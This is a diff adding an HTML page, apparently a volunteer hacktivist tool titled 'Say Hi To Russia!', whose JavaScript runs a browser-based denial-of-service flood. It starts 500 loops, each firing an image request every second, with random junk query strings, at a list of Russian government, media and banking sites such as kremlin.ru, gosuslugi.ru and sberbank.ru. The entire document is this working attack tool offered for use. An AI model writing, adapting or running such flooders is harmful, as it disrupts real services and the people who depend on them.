@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Say Hi To Russia!</title>
+<script
+  src="https://code.jquery.com/jquery-3.6.0.slim.min.js"
+  integrity="sha256-u7e5khyithlIdTpu22PHhENmPcRdFiHRjhAuHcs05RI="
+  crossorigin="anonymous"></script>
+  <style>
+  .ttl{
+  color:green;
+  }
+  .hello{
+  width:3px; height:3px;
+  margin: 2px; background-color:green;
+  }
+  
+  </style>
+</head>
+
+<body>
+
+<h3>Do not use it with metered connection<h3>
+<h4>Do not use it in roaming</h4>
+
+<div class="ttl">Total requests: <span id="total"></span></div>
+
+
+<div id="hello"></div>
+<script>
+var active = 0;
+var max = 500;
+var total = 0;
+var running = 0;
+var cache = '';
+var sites = ["https://en.kremlin.ru", "https://kremlin.ru", "https://mid.ru", "https://gov.ru", "https://www.1tv.ru", "https://gosuslugi.ru", "https://sberbank.ru", "https://mos.ru", "https://ria.ru", "https://mk.ru", "https://mil.ru","https://wagnera.ru"];
+
+for(active; active<max;active++)
+{
+    start(active);	
+}
+
+function getdomain()
+{
+	
+	return sites[Math.floor(Math.random()*sites.length)];
+}
+
+function start(id)
+{
+var url = getdomain() + "/?" + sayhi();
+if($("#i"+id).length)
+{
+$("#i"+id).remove();
+}
+
+ $("#hello").append('<img class="hello" src="'+url+'" id="i'+id+'">');
+ setTimeout(function(){
+ start(id);
+ }, 1000);
+ total++;
+ 
+ $("#total").html(total);
+   
+}
+
+function getRandomInt(min, max) {
+  min = Math.ceil(min);
+  max = Math.floor(max);
+  return Math.floor(Math.random() * (max - min) + min); 
+}
+
+
+function sayhi()
+{
+    if(!cache || getRandomInt(1,20000) == 1)
+	{
+	    
+	
+
+    var maxm = getRandomInt(100,2000);
+    var msg = '';
+    var chars = '&=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var cl = chars.length;
+    for ( var i = 0; i < maxm; i++ ) {
+      msg += chars.charAt(Math.floor(Math.random() * cl));
+   }
+   
+   }
+   else
+   {
+   
+   
+   }
+   return msg;
+}
+
+
+</script>
+</body>
+</html>
